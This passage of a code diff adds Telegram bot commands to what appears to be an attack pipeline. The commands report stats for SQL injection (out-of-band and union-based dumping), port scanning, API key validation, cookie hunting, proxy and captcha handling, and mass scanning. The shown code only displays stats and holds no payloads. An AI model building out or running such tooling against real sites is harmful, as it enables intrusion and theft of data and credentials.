+    text = p.crawler.get_stats_text()
+    text += (
+        f"\n\n<b>Config:</b>\n"
+        f"  Max depth: {p.config.deep_crawl_max_depth}\n"
+        f"  Max pages: {p.config.deep_crawl_max_pages}\n"
+        f"  Concurrent: {getattr(p.config, 'deep_crawl_concurrent', 10)}\n"
+        f"  Timeout: {p.config.deep_crawl_timeout}s\n"
+        f"  Delay: {getattr(p.config, 'deep_crawl_delay', 0.1)}s\n"
+        f"  Robots.txt: {getattr(p.config, 'deep_crawl_robots', False)}"
+    )
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /ports command — show port scanner stats."""
+    p = get_pipeline()
+    if not p.port_scanner:
+        await update.message.reply_text("❌ Port scanner is not enabled. Set port_scan_enabled=True in config.")
+        return
+    text = p.port_scanner.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_oob(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /oob command — show OOB SQLi injector stats."""
+    p = get_pipeline()
+    if not p.oob_injector:
+        await update.message.reply_text(
+            "❌ OOB SQLi injector is not enabled.\n"
+            "Set <code>oob_sqli_enabled=True</code> and configure callback host in config.",
+            parse_mode="HTML",
+        )
+        return
+    text = p.oob_injector.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_unionstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /unionstats command — show multi-DBMS union dumper stats."""
+    p = get_pipeline()
+    if not p.union_dumper:
+        await update.message.reply_text("❌ Multi-DBMS union dumper is not enabled. Set union_dump_enabled=True in config.")
+        return
+    text = p.union_dumper.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /keys command — show API key validator stats."""
+    p = get_pipeline()
+    if not p.key_validator:
+        await update.message.reply_text("❌ API key validator is not enabled. Set key_validation_enabled=True in config.")
+        return
+    text = p.key_validator.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_mlfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /mlfilter command — show ML false positive filter stats."""
+    p = get_pipeline()
+    if not p.ml_filter:
+        await update.message.reply_text("❌ ML filter is not enabled. Set ml_filter_enabled=True in config.")
+        return
+    text = p.ml_filter.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
 
 
 # ==================== ENTRY POINT ====================
@@ -1932,7 +4430,23 @@ def main():
     app.add_handler(CommandHandler("target", cmd_target, filters=chat_filter))
     app.add_handler(CommandHandler("scan", cmd_scan, filters=chat_filter))
     app.add_handler(CommandHandler("deepscan", cmd_deepscan, filters=chat_filter))
+    app.add_handler(CommandHandler("mass", cmd_mass, filters=chat_filter))
+    app.add_handler(CommandHandler("authscan", cmd_authscan, filters=chat_filter))
+    app.add_handler(CommandHandler("setgroup", cmd_setgroup, filters=chat_filter))
+    app.add_handler(CommandHandler("export", cmd_export, filters=chat_filter))
     app.add_handler(CommandHandler("cookies", cmd_cookies, filters=chat_filter))
+    app.add_handler(CommandHandler("cookiehunt", cmd_cookiehunt, filters=chat_filter))
+    app.add_handler(CommandHandler("firecrawl", cmd_firecrawl, filters=chat_filter))
+    app.add_handler(CommandHandler("captcha", cmd_captcha, filters=chat_filter))
+    app.add_handler(CommandHandler("proxy", cmd_proxy, filters=chat_filter))
+    app.add_handler(CommandHandler("browser", cmd_browser, filters=chat_filter))
+    app.add_handler(CommandHandler("ecom", cmd_ecom, filters=chat_filter))
+    app.add_handler(CommandHandler("crawlstats", cmd_crawlstats, filters=chat_filter))
+    app.add_handler(CommandHandler("ports", cmd_ports, filters=chat_filter))
+    app.add_handler(CommandHandler("oob", cmd_oob, filters=chat_filter))
+    app.add_handler(CommandHandler("unionstats", cmd_unionstats, filters=chat_filter))
+    app.add_handler(CommandHandler("keys", cmd_keys, filters=chat_filter))
+    app.add_handler(CommandHandler("mlfilter", cmd_mlfilter, filters=chat_filter))
     
     logger.info("Bot handlers registered, starting polling...")
     app.run_polling(drop_pending_updates=True)
